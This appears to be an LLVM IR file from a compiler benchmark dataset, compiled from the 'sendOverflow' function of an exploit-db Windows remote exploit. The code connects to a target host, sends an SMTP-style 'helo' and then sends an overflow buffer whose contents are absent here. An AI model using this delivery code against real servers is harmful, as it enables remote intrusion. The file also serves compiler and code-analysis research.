; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19561.c_sendOverflow.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19561.c_sendOverflow.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { %struct.TYPE_3__, i32, i32 }
%struct.TYPE_3__ = type { i32 }

@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@port = common dso_local global i32 0, align 4
@ipaddr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [33 x i8] c"Couldn't connect to the server!\0A\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"helo\0D\0A\00", align 1
@s = common dso_local global i8* null, align 8
@SOCKET_ERROR = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [30 x i8] c"Overflow sent to the server.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @sendOverflow() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.TYPE_4__, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [1024 x i8], align 16
  %7 = call i32 @WSAStartup(i32 257, i32* %2)
  %8 = load i32, i32* @PF_INET, align 4
  %9 = load i32, i32* @SOCK_STREAM, align 4
  %10 = load i32, i32* @IPPROTO_TCP, align 4
  %11 = call i32 @socket(i32 %8, i32 %9, i32 %10)
  store i32 %11, i32* %1, align 4
  %12 = load i32, i32* @AF_INET, align 4
  %13 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %3, i32 0, i32 2
  store i32 %12, i32* %13, align 4
  %14 = load i32, i32* @port, align 4
  %15 = call i32 @htons(i32 %14)
  %16 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %3, i32 0, i32 1
  store i32 %15, i32* %16, align 4
  %17 = load i32, i32* @ipaddr, align 4
  %18 = call i32 @inet_addr(i32 %17)
  %19 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %3, i32 0, i32 0
  %20 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %19, i32 0, i32 0
  store i32 %18, i32* %20, align 4
  %21 = load i32, i32* %1, align 4
  %22 = bitcast %struct.TYPE_4__* %3 to i32*
  %23 = call i32 @connect(i32 %21, i32* %22, i32 12)
  store i32 %23, i32* %5, align 4
  %24 = load i32, i32* %5, align 4
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %26, label %31

26:                                               ; preds = %0
  %27 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0))
  %28 = load i32, i32* %1, align 4
  %29 = call i32 @closesocket(i32 %28)
  %30 = call i32 (...) @WSACleanup()
  br label %60

31:                                               ; preds = %0
  store i32 0, i32* %4, align 4
  %32 = load i32, i32* %1, align 4
  %33 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %34 = load i32, i32* %4, align 4
  %35 = call i32 @recv(i32 %32, i8* %33, i32 1024, i32 %34)
  store i32 %35, i32* %5, align 4
  store i32 0, i32* %4, align 4
  %36 = load i32, i32* %1, align 4
  %37 = call i32 @strlen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %38 = load i32, i32* %4, align 4
  %39 = call i32 @send(i32 %36, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0), i32 %37, i32 %38)
  store i32 %39, i32* %5, align 4
  store i32 0, i32* %4, align 4
  %40 = load i32, i32* %1, align 4
  %41 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %42 = load i32, i32* %4, align 4
  %43 = call i32 @recv(i32 %40, i8* %41, i32 1024, i32 %42)
  store i32 %43, i32* %5, align 4
  store i32 0, i32* %4, align 4
  %44 = load i32, i32* %1, align 4
  %45 = load i8*, i8** @s, align 8
  %46 = load i8*, i8** @s, align 8
  %47 = call i32 @strlen(i8* %46)
  %48 = load i32, i32* %4, align 4
  %49 = call i32 @send(i32 %44, i8* %45, i32 %47, i32 %48)
  store i32 %49, i32* %5, align 4
  %50 = load i32, i32* %5, align 4
  %51 = load i32, i32* @SOCKET_ERROR, align 4
  %52 = icmp ne i32 %50, %51
  br i1 %52, label %53, label %55

53:                                               ; preds = %31
  %54 = call i32 @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.2, i64 0, i64 0))
  br label %55

55:                                               ; preds = %53, %31
  %56 = call i32 @Sleep(i32 2000)
  %57 = load i32, i32* %1, align 4
  %58 = call i32 @closesocket(i32 %57)
  %59 = call i32 (...) @WSACleanup()
  br label %60

60:                                               ; preds = %55, %26
  ret void
}

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i32) #1

declare dso_local i32 @connect(i32, i32*, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @closesocket(i32) #1

declare dso_local i32 @WSACleanup(...) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @Sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
